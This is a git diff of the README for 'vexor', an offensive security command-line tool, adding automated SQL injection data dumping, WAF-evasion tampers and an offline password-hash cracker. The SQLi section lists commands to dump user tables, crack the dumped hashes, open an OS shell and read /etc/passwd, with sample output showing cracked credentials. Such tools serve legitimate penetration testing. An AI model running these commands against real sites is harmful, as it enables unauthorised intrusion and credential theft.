@@ -33,7 +33,9 @@ go install github.com/0xseif-code/vexor/cmd/vexor@latest
 | 🔍 **Subdomain** | Domain Reconnaissance | Active DNS Worker-Pool + Passive crt.sh |
 | 📁 **Directory** | Endpoint Discovery | Recursive Scanning + Smart Baseline Filtering |
 | 🎯 **Fuzzing** | Parameter Mining | Multi-position markers (`FUZZ`) + Response Analysis |
-| 💉 **SQLi** | Vulnerability Exploitation | 7 Core Detection Techniques + WAF Evasion Tampers |
+| 💉 **SQLi** | Vulnerability Exploitation | 7 Detection Techniques + WAF Evasion + Automated Enumeration/Dump + Hash Cracking |
+| 🔑 **Hash Crack** | Offline Password Recovery | Auto Type Identifier + Dictionary Worker-Pool Cracker |
+| 💬 **Interactive UX** | Guided Operation | Batch-aware Prompt Engine, Live Progress, Instrumentation Summary |
 | 📚 **Wordlists** | Cache Manager | Auto on-demand SecLists downloader (`~/.vexor/`) |
 
 ---
@@ -92,8 +94,9 @@ All commands share the global flags below. Banner, logs, and progress go to
 
 | Flag | Shorthand | Type | Description | Default |
 |---|---|---|---|---|
-| `--timeout` | | int | Global request timeout (seconds) | `10` |
-| `--threads` | | int | Global concurrency threads | `50` |
+| `--timeout` | | int | Global request timeout (seconds) | `8` |
+| `--threads` | | int | Global concurrency threads | `10` |
+| `--batch` | | bool | Never ask for input; use default answers | `false` |
 | `--proxy` | | string | HTTP/SOCKS5 proxy, `http://127.0.0.1:8080` | |
 | `--headers` | | stringarray | Custom header, repeatable | |
 | `--format` | | string | Output: `plain`, `json`, `csv` | `plain` |
@@ -214,16 +217,25 @@ $ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-st
 
 Seven detection techniques across every parameter — boolean, error, time,
 union, stacked, inline, and OOB — followed by full exploitation on the first
-confirmed point.
+confirmed point. Exploitation is fully automated: `-D ... -T ... --dump` walks
+databases → tables → columns on its own, and recognized password hashes can be
+cracked offline with a built-in dictionary cracker.
 
 | Flag | Shorthand | Type | Description | Default |
 |---|---|---|---|---|
 | `--url` | `-u` | string | Target URL, e.g. `https://example.com/page?id=1` | |
 | `--request` | `-r` | string | Burp-style raw HTTP request file | |
 | `--param` | `-p` | string | Only test this parameter | |
+| `--technique` | `-t` | string | Technique codes: `B`,`E`,`U`,`S`,`T`,`I`,`O` (combinable, e.g. `BEU`) or a technique name | `all` |
 | `--dbms` | | string | Force DBMS: `mysql`, `postgres`, `mssql`, `oracle`, `sqlite` | `auto` |
 | `--level` | | int | Test intensity (1-5) | `1` |
 | `--risk` | | int | Payload risk (1-3) | `1` |
+| `--threads` | | int | SQLi concurrency threads | `10` |
+| `--fast` | | bool | Quick pass: level/risk 1, error + union only | `false` |
+| `--timeout` | | int | Per-request timeout (seconds) | `8` |
+| `--delay` | | int | Sleep between requests (milliseconds) | `0` |
+| `--retries` | | int | Retries per failed request | `1` |
+| `--batch` | | bool | Run non-interactive; pick defaults for every prompt | `false` |
 | `--tamper` | | stringslice | Tamper scripts, e.g. `space2comment,randomcase` | |
 | `--auto-tamper` | | bool | Fingerprint WAF + use suggested tamper chain | `false` |
 | `--oob-domain` | | string | Domain for OOB (DNS/HTTP) channels | |
@@ -234,6 +246,8 @@ confirmed point.
 | `--database` | `-D` | string | DB name for `--tables/--columns/--dump` | |
 | `--table` | `-T` | string | Table name for `--columns/--dump` | |
 | `--column` | `-C` | stringslice | Specific columns to dump, repeatable | |
+| `--crack` | | bool | Cracking mode: crack hashes with no extra prompt | `false` |
+| `--no-crack` | | bool | Cracking mode: never crack hashes | `false` |
 | `--os-shell` | | bool | Interactive OS shell via the injection point | `false` |
 | `--read-file` | | string | Read a file from the DB server | |
 | `--write-file` | | string | Write a local file to the DB server | |
@@ -243,35 +257,53 @@ confirmed point.
 # Basic SQL injection scan
 vexor sqli -u "http://target.com/page.php?id=1"
 
-# Automated WAF evasion + data extraction
+# Restrict to error + union techniques on a single parameter
+vexor sqli -u "http://target.com/page.php?id=1" -p id -t "BEU"
+
+# Automated scan + full data extraction (db -> table -> columns on its own)
 vexor sqli -u "http://target.com/page.php?id=1" --auto-tamper --dbs
 
-# Table dump
+# Dump a table (table resolved automatically if the name is close)
 vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C id,username,password
+
+# Cracking mode: dump hashes, then answer the crack prompt (or --batch)
+vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users --crack
+vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C password --batch
 
 # Full takeover
 vexor sqli -u "http://target.com/page.php?id=1" --os-shell
 vexor sqli -u "http://target.com/page.php?id=1" --read-file /etc/passwd
 ```
 
+Interactive prompts (DBMS filter, WAF tamper, parameter focus, large-dump
+limits, hash cracking) are auto-answered with sane defaults under `--batch` or
+when stdin is not a terminal.
+
 ```text
 $ vexor sqli -u "https://example.com/page?id=1" --level 2
-[*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=50)
+[*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=10)
 URL query parameter/GET/id technique=boolean dbms=mysql confidence=95
 URL query parameter/GET/id technique=error   dbms=mysql confidence=88
 POST form parameter/POST/user technique=time      dbms=mysql confidence=76
 ...
 [+] scan complete: 3 findings, 412 requests, 2 errors in 2m05s
 [i] fingerprinted DBMS: mysql
+[+] done | requests=412 | elapsed=125.3s | rate=3.3 req/s | phase(detect=125.3s)
 
-$ vexor sqli -u "https://example.com/page?id=1" --dbs
+$ vexor sqli -u "https://example.com/page?id=1" --dump -D shop -T users --crack
 ...
 [i] first confirmed injection point: GET/id (boolean)
-information_schema
-shop
-mysql
+id      username        password
+1       admin           *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+2       bob             *A4B6157319038726FF3A9A4DFFED4DEB
 ...
-[+] done in 3m41s
+[+] dumped 2 rows from shop.users (3 columns)
+[*] cracking 2 hash(es) via default 10k passwords
+[*] Cracking hashes: 1/2 solved (50.0%) | Speed: 312 480 H/s
+[*] Cracking finished: 2/2 hashes solved (100.0%) in 412ms (4 940 attempts)
+shop.users: admin | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 (admin123)
+shop.users: bob | *A4B6157319038726FF3A9A4DFFED4DEB (bob)
+[+] done | requests=88 | elapsed=9.7s | rate=9.1 req/s | phase(detect=5.2s enum=1.6s dump=2.9s)
 ```
 
 ### `update-wordlists` — Manage the local cache
@@ -305,6 +337,10 @@ $ vexor update-wordlists
   `passwords`, `passwords-large`, `endpoints`.
 - **Custom wordlists** (`-w /path/to/file.txt`): any local file, one word per
   line — overrides the size preset.
+- **Hash cracking** uses the cached `passwords` list by default, or a custom
+  file; the cracker identifies the hash type (MD5, SHA-1, bcrypt, ...) and
+  streams the dictionary through a worker pool, so large wordlists never load
+  entirely into memory.
 
 Output formats are per-scan:
 
